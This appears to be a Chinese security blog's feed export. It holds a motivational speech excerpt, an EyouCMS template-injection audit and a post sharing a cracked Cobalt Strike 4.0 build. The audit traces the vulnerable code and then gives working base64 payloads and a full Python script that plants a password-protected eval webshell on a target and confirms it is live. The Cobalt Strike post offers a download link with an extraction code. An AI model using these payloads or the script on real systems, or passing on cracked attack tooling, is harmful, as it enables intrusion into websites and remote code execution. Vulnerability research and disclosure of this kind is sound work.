        <content type="html"><![CDATA[<p>当你未有积淀，一心陷于物欲之时</p><p>尝试读读俞敏洪这篇演讲稿《花儿在不同的季节开放》</p><h2 id="节选："><a href="#节选：" class="headerlink" title="节选："></a>节选：</h2><p>   <strong>我们的生命和四季的花儿一样，在不同的阶段有着不同阶段的美丽：童年的纯真，少年的遐想，青年的冲动，中年的成熟，老年的智慧，都是人生不同阶段的美丽。假如我们一出生就像老年人一样洞察世事老于世故，这一辈子就没了期待；如果反过来我们一辈子都像毛头小伙一样懵懂世事青涩简单，这一辈子也就没有了进步和精彩。</strong></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192322007" alt="img"></p><p>​    人生之所以可贵，在于我们在不同的阶段总会有不同的成长和领悟。<strong>我最怕的就是一辈子没有变化或者所有的精彩一次释放完毕。没有变化意味着停滞不前，也意味着蒙昧无知；所有的精彩一次释放完毕意味着生命就像夜空中的礼花，尽管精彩得炫目但一瞬间就归于黑暗。</strong>我们看到很多年轻时就成名的电影明星或歌星，像夜空的流星一样，闪耀登场，瞬间消失，总觉得有点遗憾。现在的很多青年人急于求成，看到别人年轻时成功了就很着急，寻找各种方法取得所谓的成功，甚至不惜在网络上自暴隐私；还有很多大学生刚进大学就想创业赚钱，把通过读书积累自己一辈子底蕴这样重要的事情甩到脑后。这些人都陷入了误区，认为一时的成功就等于一世的成功。其实人生就像花儿一样，有的人在春天就开放出了美丽的人生之花，有的人要等到夏天、秋天和冬天才开放出绚烂的人生之花。</p><p>​    <strong>我们的人生并不会因为花季晚到就不精彩，也许反而会更加精彩，因为我们有更多的期待并付出了更多的努力。是的，我们要做的就是努力进取，期待未来。</strong>我们可以学学夏天的荷花、秋天的菊花和冬天的梅花，也许越晚开越香，越晚开花期越长呢。肯德基的创始人山德士50岁才开始经营一家小小的快餐店，最后做成了世界上最大的餐饮连锁店；姜太公80岁的时候还在渭河上钓鱼，最后终于得到周文王的重用，一起创建了周朝八百年的天下；齐白石到90岁艺术创作才达到了顶峰。<strong>花有自己的季节，人有自己的时刻。英文中有一句谚语叫做“Every dog has its day”，每条狗都有自己的得意日子，何况我们人呢。让我们过一种从容的人生，在努力进取中期待生命鲜花怒放的时刻。</strong></p><p>​    花儿一般只开放一次，完成灿烂的生命后，化作春泥再护花，守护后一代生命再次绽放出灿烂的花朵。人可以比花儿做得更好，通过我们持续不断地努力，我们可以让生命持续不断开放出灿烂之花。苏轼既是伟大的诗人，也是伟大的书法家，又是一个很成功的政治家；康熙皇帝既是伟大的统治者，又是伟大的军事家，而且精通汉满蒙三种文字，有很好的高等数学和天文学知识；爱因斯坦三岁多还不会讲话，直到九岁时讲话还不很通畅，每一句话都必须经过吃力的思考才能讲出来。在念小学和中学时，爱因斯坦由于举止缓慢，不爱同人交往，老师和同学都不喜欢他。教他希腊文和拉丁文的老师对他很厌恶，曾经公开说：“爱因斯坦，你长大后肯定不会成器。”但爱因斯坦最后成了为人类作出杰出贡献的科学家，而且还是相当不错的一位小提琴家。</p><p>   所以，只要我们不断努力，生命的花季就可以很长，而且可以绽放出不同的美丽花儿。很多人不成功是没有给自己足够的时间和耐心去努力，很多人一生只成功了一次就像流星一样消失，他们都没有懂得成功是一种持续不断努力的过程。当我们懂得人生每个阶段通过努力都能够精彩时，也许我们的少年就会像春天的桃花一样绚烂，青年就会像夏天的荷花一样清香，中年就会像秋天的菊花一样坚忍，老年就会像冬天的梅花一样昂扬。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 生活偶悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Eyoucms SSTI漏洞审计</title>
      <link href="/2020/03/25/Eyoucms-SSTI%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/"/>
      <url>/2020/03/25/Eyoucms-SSTI%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-审计起因"><a href="#0x01-审计起因" class="headerlink" title="0x01 审计起因"></a>0x01 审计起因</h3><p><img src="https://s1.ax1x.com/2020/03/25/8xGpDg.png" alt="8xGpDg.png"><br>由于在先知查看文章的时候无意看到了EyouCMS漏洞复现文章，于是产生了审计之心</p><h3 id="0x02-EyouCMS简介"><a href="#0x02-EyouCMS简介" class="headerlink" title="0x02 EyouCMS简介"></a>0x02 EyouCMS简介</h3><blockquote><p>EyouCms是基于TP5.0框架为核心开发的免费+开源的企业内容管理系统，专注企业建站用户需求。提供海量各行业模板，降低中小企业网站建设、网络营销成本，致力于打造用户舒适的建站体验。这是一套安全、简洁、免费的流行CMS，包含完整后台管理、前台展示，直接下载安装即可使用。 演示网址：[<a href="http://demo.eyoucms.com][2]">http://demo.eyoucms.com][2]</a> 官方网站：[<a href="http://www.eyoucms.com][3]">http://www.eyoucms.com][3]</a></p></blockquote><h3 id="0x03-代码分析"><a href="#0x03-代码分析" class="headerlink" title="0x03 代码分析"></a>0x03 代码分析</h3><p>进入<code>/application/api/controller/Ajax.php</code>中的**<code>function get_tag_memberlist</code>**方法</p><pre><code class="php">public function get_tag_memberlist()&#123;    if (IS_AJAX_POST) &#123;        $htmlcode = input(&#39;post.htmlcode/s&#39;);        $htmlcode = htmlspecialchars_decode($htmlcode);        $attarray = input(&#39;post.attarray/s&#39;);        $attarray = htmlspecialchars_decode($attarray);        $attarray = json_decode(base64_decode($attarray));        /*拼接完整的memberlist标签语法*/        $innertext = &quot;&#123;eyou:memberlist&quot;;        foreach ($attarray as $key =&gt; $val) &#123;            if (in_array($key, [&#39;js&#39;])) &#123;                continue;            &#125;            $innertext .= &quot; &#123;$key&#125;=&#39;&#123;$val&#125;&#39;&quot;;        &#125;        $innertext .= &quot; js=&#39;on&#39;&#125;&quot;;        $innertext .= $htmlcode;        $innertext .= &quot;&#123;/eyou:memberlist&#125;&quot;;        /*--end*/        $msg = $this-&gt;display($innertext); // 渲染模板标签语法        $data[&#39;msg&#39;] = $msg;        $this-&gt;success(&#39;读取成功！&#39;, null, $data);    &#125;    $this-&gt;error(&#39;加载失败！&#39;);&#125;</code></pre><p>3 Line: 判断是否AJAX请求<br>4 Line: 从post获取用户输入参数htmlcode的值并将结果赋值给$htmlcode<br>5 Line: 将$htmlcode中的实体字符转换为正常字符<br>7 Line: 从post获取用户输入参数attarray的值并将结果赋值给$attarray<br>8 Line: 将$attarray中的实体字符转换为正常字符<br>9 Line: 将$attarray进行base64解码再json解码<br>12 Line: 定义标签<br>13~18 Line: 使用foreach将$attay以键值对的方式遍历出来，判断每一个元素是否为js如果是那么直接进入下一次循环，否则“{$key}&#x3D;’{$val}’”连接到标签后面<br>19 Line: 闭合第一个标签<br>20 Line: 将$htmlcode拼接到标签后，作为内容使用<br>21 Line: 将闭合标签拼接到$innertext中<br>23 Line: 调用基类中的display方法并将$innertext传入</p><p>跟踪到<code>/core/library/think/Controll.php</code>文件中的**<code>display</code>**方法</p><pre><code class="php">protected function display($content = &#39;&#39;, $vars = [], $replace = [], $config = [])&#123;    return $this-&gt;view-&gt;display($content, $vars, $replace, $config);&#125;</code></pre><p>3 Line: 调用视图类中的display方法，并将$content、$vars、$replace、$config传入</p><p>跟踪到<code>/core/library/think/View.php</code>文件中的**<code>display</code>**方法</p><pre><code class="php">public function display($content, $vars = [], $replace = [], $config = [])&#123;    return $this-&gt;fetch($content, $vars, $replace, $config, true);&#125;</code></pre><p>3 Line: 调用当前类中的fetch方法并将并将$content、$vars、$replace、$config传入</p><p>跟踪到<code>/core/library/think/View.php</code>文件中的**<code>fetch</code>**方法</p><pre><code class="php">public function fetch($template = &#39;&#39;, $vars = [], $replace = [], $config = [], $renderContent = false)&#123;    // 模板变量    $vars = array_merge(self::$var, $this-&gt;data, $vars);    // 页面缓存    ob_start();    ob_implicit_flush(0);    // 渲染输出    try &#123;        $method = $renderContent ? &#39;display&#39; : &#39;fetch&#39;;        // 允许用户自定义模板的字符串替换        // $replace = array_merge($this-&gt;replace, $replace, (array) $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;));        $replace = array_merge($this-&gt;replace, (array) $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;), $replace); // 解决一个页面上调用多个钩子的冲突问题 by 小虎哥        /*插件模板字符串替换，不能放在构造函数，毕竟构造函数只执行一次 by 小虎哥*/        // if ($this-&gt;__isset(&#39;weappInfo&#39;)) &#123;        //     $weappInfo = $this-&gt;__get(&#39;weappInfo&#39;);        //     if (!empty($weappInfo[&#39;code&#39;])) &#123;        //         $replace[&#39;__WEAPP_TEMPLATE__&#39;] = ROOT_DIR.&#39;/&#39;.WEAPP_DIR_NAME.&#39;/&#39;.$weappInfo[&#39;code&#39;].&#39;/template&#39;;        //     &#125;        // &#125;        /*--end*/        $this-&gt;engine-&gt;config(&#39;tpl_replace_string&#39;, $replace);        $this-&gt;engine-&gt;$method($template, $vars, $config);    &#125; catch (\Exception $e) &#123;        ob_end_clean();        throw $e;    &#125;    // 获取并清空缓存    $content = ob_get_clean();    // 内容过滤标签    Hook::listen(&#39;view_filter&#39;, $content);    // $this-&gt;checkcopyr($content);    return $content;&#125;</code></pre><p>4 Line: 将当前类中的成员属性$var、$data以及传入的$vars合并为一个数组并赋给$vars<br>7~8 Line: 开启页面缓存<br>11 Line: 使用三元运算符判断外部传入的$renderContent是否为真，若为真那么将display赋值给$method，否则将fetch赋值给$method<br>24 Line: 调用Think类中的$method方法并将$template、$vars、$config传入</p><p>跟踪到<code>/core/library/think/view/driver/Think.php</code>中的**<code>display</code>**方法</p><pre><code class="php">public function display($template, $data = [], $config = [])&#123;    $this-&gt;template-&gt;display($template, $data, $config);&#125;</code></pre><p>3 Line: 调用模板类中的display方法并将$template、$data、$config传入</p><p>跟踪到<code>/core/library/think/Template.php</code>中的**<code>display</code>**方法</p><pre><code class="php">public function display($content, $vars = [], $config = [])&#123;    if ($vars) &#123;        $this-&gt;data = $vars;    &#125;    if ($config) &#123;        $this-&gt;config($config);    &#125;    $cacheFile = $this-&gt;config[&#39;cache_path&#39;] . $this-&gt;config[&#39;cache_prefix&#39;] . md5($content) . &#39;.&#39; . ltrim($this-&gt;config[&#39;cache_suffix&#39;], &#39;.&#39;);    if (!$this-&gt;checkCache($cacheFile)) &#123;        // 缓存无效 模板编译        $this-&gt;compiler($content, $cacheFile);    &#125;    // 读取编译存储    $this-&gt;storage-&gt;read($cacheFile, $this-&gt;data);&#125;</code></pre><p>3<del>5 Line: 判断外部传入的$vars是否有值，若有那么则将$vars赋值给当前类中的成员属性data中<br>6</del>8 Line: 判断$config是否有值，若有那么将$config传入当前类中的config方法<br>9 Line: 生成缓存文件名称赋值给$cacheFile<br>10~13 Line: 判断是否没有$cacheFile这个缓存文件，为真则调用当前类中的compiler方法并且将$content及$cacheFile传入其中</p><p>跟踪到<code>/core/library/think/Template.php</code>中的**<code>compiler</code>**方法</p><pre><code class="php">private function compiler(&amp;$content, $cacheFile)&#123;    // 判断是否启用布局    if ($this-&gt;config[&#39;layout_on&#39;]) &#123;        if (false !== strpos($content, &#39;&#123;__NOLAYOUT__&#125;&#39;)) &#123;            // 可以单独定义不使用布局            $content = str_replace(&#39;&#123;__NOLAYOUT__&#125;&#39;, &#39;&#39;, $content);        &#125; else &#123;            // 读取布局模板            $layoutFile = $this-&gt;parseTemplateFile($this-&gt;config[&#39;layout_name&#39;]);            if (is_array($layoutFile)) &#123; // 引入模板的错误友好提示 by 小虎哥                $content = !empty($layoutFile[&#39;msg&#39;]) ? $layoutFile[&#39;msg&#39;] : $content;            &#125; else if ($layoutFile) &#123;                // 替换布局的主体内容                $content = str_replace($this-&gt;config[&#39;layout_item&#39;], $content, file_get_contents($layoutFile));            &#125;        &#125;    &#125; else &#123;        $content = str_replace(&#39;&#123;__NOLAYOUT__&#125;&#39;, &#39;&#39;, $content);    &#125;    // 模板解析    $this-&gt;parse($content);    if ($this-&gt;config[&#39;strip_space&#39;]) &#123;        /* 去除html空格与换行 */        $find    = [&#39;~&gt;\s+&lt;~&#39;, &#39;~&gt;(\s+\n|\r)~&#39;];        $replace = [&#39;&gt;&lt;&#39;, &#39;&gt;&#39;];        $content = preg_replace($find, $replace, $content);    &#125;    // 优化生成的php代码    $content = preg_replace(&#39;/\?&gt;\s*&lt;\?php\s(?!echo\b)/s&#39;, &#39;&#39;, $content);    // 模板过滤输出    $replace = $this-&gt;config[&#39;tpl_replace_string&#39;];    $content = str_replace(array_keys($replace), array_values($replace), $content);    // 添加安全代码及模板引用记录    $content = &#39;&lt;?php if (!defined(\&#39;THINK_PATH\&#39;)) exit(); /*&#39; . serialize($this-&gt;includeFile) . &#39;*/ ?&gt;&#39; . &quot;\n&quot; . $content;    // 编译存储    $this-&gt;storage-&gt;write($cacheFile, $content);    $this-&gt;includeFile = [];    return;&#125;</code></pre><p>23 Line: 将外部传入的$content传到当前类中的parse（解析模板）方法中</p><p>跟踪到<code>/core/library/think/Template.php</code>中的**<code>parse</code>**方法</p><pre><code class="php">public function parse(&amp;$content)&#123;    // 内容为空不解析    if (empty($content)) &#123;        return;    &#125;    // 替换eyou:literal标签内容    $this-&gt;parseEyouLiteral($content);    // 替换literal标签内容    $this-&gt;parseLiteral($content);    // 解析继承    $this-&gt;parseExtend($content);    // 解析布局    $this-&gt;parseLayout($content);    // 检查eyou:include语法  by 小虎哥    $this-&gt;parseEyouInclude($content);    // 检查include语法    $this-&gt;parseInclude($content);    // 替换包含文件中literal标签内容    $this-&gt;parseLiteral($content);    // 替换包含文件中eyou:literal标签内容    $this-&gt;parseEyouLiteral($content);    // 检查PHP语法    $this-&gt;parsePhp($content);    // 获取需要引入的标签库列表    // 标签库只需要定义一次，允许引入多个一次    // 一般放在文件的最前面    // 格式：&lt;taglib name=&quot;html,mytag...&quot; /&gt;    // 当TAGLIB_LOAD配置为true时才会进行检测    if ($this-&gt;config[&#39;taglib_load&#39;]) &#123;        $tagLibs = $this-&gt;getIncludeTagLib($content);        if (!empty($tagLibs)) &#123;            // 对导入的TagLib进行解析            foreach ($tagLibs as $tagLibName) &#123;                $this-&gt;parseTagLib($tagLibName, $content);            &#125;        &#125;    &#125;    // 预先加载的标签库 无需在每个模板中使用taglib标签加载 但必须使用标签库XML前缀    if ($this-&gt;config[&#39;taglib_pre_load&#39;]) &#123;        $tagLibs = explode(&#39;,&#39;, $this-&gt;config[&#39;taglib_pre_load&#39;]);        foreach ($tagLibs as $tag) &#123;            $this-&gt;parseTagLib($tag, $content);        &#125;    &#125;    // 内置标签库 无需使用taglib标签导入就可以使用 并且不需使用标签库XML前缀    $tagLibs = explode(&#39;,&#39;, $this-&gt;config[&#39;taglib_build_in&#39;]);    foreach ($tagLibs as $tag) &#123;        $this-&gt;parseTagLib($tag, $content, true);    &#125;    // 解析普通模板标签 &#123;$tagName&#125;    $this-&gt;parseTag($content);    // 还原被替换的eyou:Literal标签    $this-&gt;parseEyouLiteral($content, true);    // 还原被替换的Literal标签    $this-&gt;parseLiteral($content, true);    return;&#125;</code></pre><p>24 Line: 调用当前类中的parsePhp（解析php标签）方法并将$content传入</p><p>跟踪到<code>/core/library/think/Template.php</code>中的**<code>parsePhp</code>**方法</p><pre><code class="php">private function parsePhp(&amp;$content)&#123;    // 短标签的情况要将&lt;?标签用echo方式输出 否则无法正常输出xml标识    $content = preg_replace(&#39;/(&lt;\?(?!php|=|$))/i&#39;, &#39;&lt;?php echo \&#39;\\1\&#39;; ?&gt;&#39; . &quot;\n&quot;, $content);    // 过滤eval函数，防止被注入执行任意代码 by 小虎哥    $view_replace_str = config(&#39;view_replace_str&#39;);    if (isset($view_replace_str[&#39;__EVAL__&#39;])) &#123;        if (stristr($content, &#39;&#123;eyou:php&#125;&#39;)) &#123; // 针对&#123;eyou:php&#125;标签语法处理            preg_match_all(&#39;/&#123;eyou\:php&#125;.*&#123;\/eyou\:php&#125;/iUs&#39;, $content, $matchs);            $matchs = !empty($matchs[0]) ? $matchs[0] : [];            if (!empty($matchs)) &#123;                foreach($matchs as $key =&gt; $val)&#123;                    $valNew = preg_replace(&#39;/&#123;(\/)?eyou\:php&#125;/i&#39;, &#39;&#39;, $val);                    $valNew = preg_replace(&quot;/([\W]+)eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);                    $valNew = preg_replace(&quot;/^eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);                    $valNew = &quot;&#123;eyou:php&#125;&#123;$valNew&#125;&#123;/eyou:php&#125;&quot;;                    $content = str_ireplace($val, $valNew, $content);                &#125;            &#125;        &#125; else if (stristr($content, &#39;&#123;php&#125;&#39;)) &#123; // 针对&#123;php&#125;标签语法处理            preg_match_all(&#39;/&#123;php&#125;.*&#123;\/php&#125;/iUs&#39;, $content, $matchs);            $matchs = !empty($matchs[0]) ? $matchs[0] : [];            if (!empty($matchs)) &#123;                foreach($matchs as $key =&gt; $val)&#123;                    $valNew = preg_replace(&#39;/&#123;(\/)?php&#125;/i&#39;, &#39;&#39;, $val);                    $valNew = preg_replace(&quot;/([\W]+)eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);                    $valNew = preg_replace(&quot;/^eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);                    $valNew = &quot;&#123;php&#125;&#123;$valNew&#125;&#123;/php&#125;&quot;;                    $content = str_ireplace($val, $valNew, $content);                &#125;            &#125;        &#125; else if (false !== strpos($content, &#39;&lt;?php&#39;)) &#123; // 针对原生php语法处理            $content = preg_replace(&quot;/(@)?eval(\s*)\(/i&quot;, &#39;intval(&#39;, $content);            $this-&gt;config[&#39;tpl_deny_php&#39;] &amp;&amp; $content = preg_replace(&quot;/\?\bphp\b/i&quot;, &quot;？ｍｕｍａ&quot;, $content);        &#125;    &#125;    // end    // PHP语法检查    if ($this-&gt;config[&#39;tpl_deny_php&#39;] &amp;&amp; false !== strpos($content, &#39;&lt;?php&#39;)) &#123;        if (config(&#39;app_debug&#39;)) &#123; // 调试模式下中断模板渲染 by 小虎哥            throw new Exception(&#39;not allow php tag&#39;, 11600);        &#125; else &#123; // 运营模式下继续模板渲染 by 小虎哥            echo(lang(&#39;not allow php tag&#39;));        &#125;    &#125;    return;&#125;</code></pre><p>4 Line: 将模板中php短标签转换为<?php echo ‘1’?></p><p>21 Line: 判断传入的$content中是否包含了{php}</p><p>22 Line: 使用正则表达式匹配出$content中所有包含了“{php}任意内容{&#x2F;php}”的标签</p><p>23 Line: 使用三目运算符判断匹配出来的数组中的第0个元素是否有值，如果有值那么将第0个元素的值赋给$matchs否则将空数组赋给$matchs</p><p>24 Line: 判断$matchs不为空</p><p>25 Line: 将$matchs使用foreach循环遍历</p><p>26 Line: 将$val中的“{&#x2F;任意空白字符php}”替换为空并赋给$valnew</p><p>27 Line: 将$valnew中的“多个或零个0-9A-Za-Z_eval(”替换为“intval(”</p><p>28 Line: 将$valnew中的“开始为eval任意空白字符(”替换为“intval(”</p><p>29 Line: 将字符串“{php}{$valNew}{&#x2F;php}”赋给$valnew</p><p>30 Line: 将$content中的$val替换为$valNew</p><h3 id="0x04-漏洞探测"><a href="#0x04-漏洞探测" class="headerlink" title="0x04 漏洞探测"></a>0x04 漏洞探测</h3><pre><code>Payload:attarray=eyJ7cGhwfXBocGluZm8oKTt7XC9waHB9Ijoie3BocH1waHBpbmZvKCk7e1wvcGhwfSJ9&amp;html=&#123;php&#125;phpinfo();&#123;/php&#125;</code></pre><p><img src="https://s1.ax1x.com/2020/03/25/8xGqLF.png" alt="8xGqLF.png"></p><h3 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h3><p>Payload生成方式:</p><pre><code>base64_encode(jsonstring)</code></pre><p>eval会被替换成intval，所以我们采用base64加密写入webshell的方式<br>php代码如下：</p><pre><code>file_put_contents(&quot;./wait.php&quot;,base64_decode(&quot;PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==&quot;));</code></pre><p>PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs&#x2F;Pg&#x3D;&#x3D;内容：</p><pre><code>&lt;?php eval($_REQUEST[“w”]);?&gt;</code></pre><p>将php标签转换为json格式并加密：</p><pre><code class="php">print base64_encode(json_encode(array(&quot;&#123;php&#125;file_put_contents(&#39;./wait.php&#39;,base64_decode(\&quot;PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==\&quot;));&#123;/php&#125;&quot;=&gt;&quot;&#123;php&#125;file_put_contents(&#39;./wait.php&#39;,base64_decode(\&quot;PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==\&quot;));&#123;/php&#125;&quot;)));eyJ7cGhwfWZpbGVfcHV0X2NvbnRlbnRzKCcuXC93YWl0LnBocCcsYmFzZTY0X2RlY29kZShcIlBEOXdhSEFnWVhOelpYSjBLQ1JmVWtWUlZVVlRWRnNpZHlKZEtUc1wvUGc9PVwiKSk7e1wvcGhwfSI6IntwaHB9ZmlsZV9wdXRfY29udGVudHMoJy5cL3dhaXQucGhwJyxiYXNlNjRfZGVjb2RlKFwiUEQ5d2FIQWdZWE56WlhKMEtDUmZVa1ZSVlVWVFZGc2lkeUpkS1RzXC9QZz09XCIpKTt7XC9waHB9In0=</code></pre><p>pyload:</p><pre><code>attarray=eyJ7cGhwfWZpbGVfcHV0X2NvbnRlbnRzKCcuXC93YWl0LnBocCcsYmFzZTY0X2RlY29kZShcIlBEOXdhSEFnWVhOelpYSjBLQ1JmVWtWUlZVVlRWRnNpZHlKZEtUc1wvUGc9PVwiKSk7e1wvcGhwfSI6IntwaHB9ZmlsZV9wdXRfY29udGVudHMoJy5cL3dhaXQucGhwJyxiYXNlNjRfZGVjb2RlKFwiUEQ5d2FIQWdZWE56WlhKMEtDUmZVa1ZSVlVWVFZGc2lkeUpkS1RzXC9QZz09XCIpKTt7XC9waHB9In0=&amp;htmlcode=bb</code></pre><p><img src="https://s1.ax1x.com/2020/03/25/8xJJFs.png" alt="8xJJFs.png"></p><p>htmlcode参数作为随机方式传递</p><h3 id="0x06-漏洞修复"><a href="#0x06-漏洞修复" class="headerlink" title="0x06 漏洞修复"></a>0x06 漏洞修复</h3><p>可以使用assign方法来将标签直接替换成我们需要的值，而不是将标签传入display方法中将标签直接编译，危险性大大提升</p><h3 id="0x07-自动化测试脚本"><a href="#0x07-自动化测试脚本" class="headerlink" title="0x07 自动化测试脚本"></a>0x07 自动化测试脚本</h3><pre><code class="console">silly@PenetrationOs:~#: python eyoucms-ssti.py -u http://192.168.1.106:8085/ -o abc[+] 正在请求目标地址:http://192.168.1.106:8085/?m=api&amp;c=ajax&amp;a=get_tag_memberlist 目标地址http://192.168.1.106:8085/?m=api&amp;c=ajax&amp;a=get_tag_memberlist存活[+] 正在向目标地址http://192.168.1.106:8085/?m=api&amp;c=ajax&amp;a=get_tag_memberlist写入abc.php 疑似成功写入Webshell[+] 正在探测Webshell(http://192.168.1.106:8085/abc.php)是否存活 Webshell(http://192.168.1.106:8085/abc.php)已存活 密码：ceshi</code></pre><pre><code>#!/usr/bin/python -*- coding: UTF-8 -*-import requestsimport sys,getoptimport json,base64import timeclass Eyoucms:    session = None    headers = None    password = &quot;ceshi&quot;    output = &quot;ceshi&quot;    requesturi = &quot;/?m=api&amp;c=ajax&amp;a=get_tag_memberlist&quot;    def __init__(self,headers):        self.headers = headers        self.getparam(sys.argv[1:])        self.requestsdata = &#123;            &quot;attarray&quot;:self.createpyload(),            &quot;htmlcode&quot;:time.time()        &#125;        self.run()    def getparam(self,argv):        try:            options, args = getopt.getopt(argv, &quot;h:u:p:o:&quot;, [&quot;help&quot;, &quot;url=&quot;,&quot;password=&quot;,&quot;output=&quot;])        except getopt.GetoptError:            print &#39;eyoucms-ssti.py -u url -p password -o outputfile&#39;            return        for option, value in options:            if option in (&quot;-h&quot;, &quot;--help&quot;):                print &#39;eyoucms-ssti.py -u url&#39;            if option in (&quot;-u&quot;, &quot;--url&quot;):                if(self.request(value).status_code != 404):                    self.url = value            if option in (&quot;-p&quot;, &quot;--password&quot;):                    if(value != None):                        self.password = value                    else:                        self.password = &quot;ceshi&quot;            if option in (&quot;-o&quot;, &quot;--output&quot;):                    if(value != None):                        self.output = value.replace(&quot;.php&quot;,&quot;&quot;)                    else:                        self.output = &quot;ceshi&quot;    def run(self):        url = self.url.rstrip(&#39;/&#39;)+self.requesturi        print &quot;[+] 正在请求目标地址:%s&quot;%(url)        if(self.request(url).status_code == 200):            print &quot; 目标地址%s存活&quot;%url        else:            print &quot;[-] 目标地址%s探测失败&quot;%url            return        print &quot;[+] 正在向目标地址%s写入%s.php&quot;%(url,self.output)        if(self.request(url,&quot;post&quot;).status_code == 200):            print &quot; 疑似成功写入Webshell&quot;        shell = self.url.rstrip(&#39;/&#39;)+&quot;/%s.php&quot;%self.output        print &quot;[+] 正在探测Webshell(%s)是否存活&quot;%(shell)        if(self.request(shell).status_code == 200):            print &quot; Webshell(%s)已存活\n 密码：%s&quot;%(shell,self.password)    def createpyload(self):        short = base64.b64encode(&quot;&lt;php eval($_REQUEST[%s]);?&gt;&quot;%self.password)        file = self.output        payload = &#123;            &quot;&#123;php&#125;1&#123;/php&#125;&quot;:&quot;&#123;php&#125;file_put_contents(&#39;./%s.php&#39;,base64_decode(&#39;%s&#39;));&#123;/php&#125;&quot;%(file,short)        &#125;        return base64.b64encode(json.dumps(payload))    def request(self,url,method=&quot;get&quot;):        respone = None        if(not self.session):            self.session = requests.Session()        if(method == &quot;get&quot;):            try:                respone = self.session.get(url=url,headers=self.headers)            except requests.exceptions.ConnectTimeout:                print &quot;[-] 请求%s超时&quot;%url                return            except requests.exceptions.ConnectionError:                print &quot;[-] 请求%s无效&quot;%url                return            return respone        elif(method == &quot;post&quot;):            try:                respone = self.session.post(url=url,data=self.requestsdata,headers=self.headers)            except requests.exceptions.ConnectTimeout:                print &quot;[-] 请求%s超时&quot;%url                return            except requests.exceptions.ConnectionError:                print &quot;[-] 请求%s无效&quot;%url                return        return respone   if __name__ == &quot;__main__&quot;:    headers = &#123;        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0&quot;,        &quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;    &#125;    Eyoucms(headers)</code></pre><p>###漏洞影响范围<br>  EyouCMS&lt;&#x3D;1.41</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自制CS 4.0 去暗桩/VNC修复/x64Payload修复/终极汉化版本</title>
      <link href="/2020/03/21/%E8%87%AA%E5%88%B6CS-4-0-%E5%8E%BB%E6%9A%97%E6%A1%A9-VNC%E4%BF%AE%E5%A4%8D-x64Payload%E4%BF%AE%E5%A4%8D-%E7%BB%88%E6%9E%81%E6%B1%89%E5%8C%96%E7%89%88%E6%9C%AC/"/>
      <url>/2020/03/21/%E8%87%AA%E5%88%B6CS-4-0-%E5%8E%BB%E6%9A%97%E6%A1%A9-VNC%E4%BF%AE%E5%A4%8D-x64Payload%E4%BF%AE%E5%A4%8D-%E7%BB%88%E6%9E%81%E6%B1%89%E5%8C%96%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>两天过去了，我知道，大家都在等CS完美破解版</p><p>从CS4.0出了以后，足足折腾两天了。暗桩,x64 payload,vnc支持等等问题层出不穷</p><p>而且官方也没有编写windows下启动teamserver的批处理文件</p><p>自己动手，丰衣足食！</p><p>参考先知一位师傅和国外某牛的修复方法，CS4.0去暗桩，windows teamserver支持，vnc修复，x64 payload修复，汉化支持 终极版本今天发布！！</p><p>如果不需要汉化的话，在start.bat中去掉agent即可</p><p>站着干嘛，进来白嫖啊</p><p>链接：<a href="https://pan.baidu.com/s/11rJVvgKviN82sVOrpHoSlg">https://pan.baidu.com/s/11rJVvgKviN82sVOrpHoSlg</a><br>提取码：z44m</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191702649.png" alt="8RwtOS.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现资产搜集QQ机器人</title>
      <link href="/2019/12/19/%E5%AE%9E%E7%8E%B0%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
      <url>/2019/12/19/%E5%AE%9E%E7%8E%B0%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
      
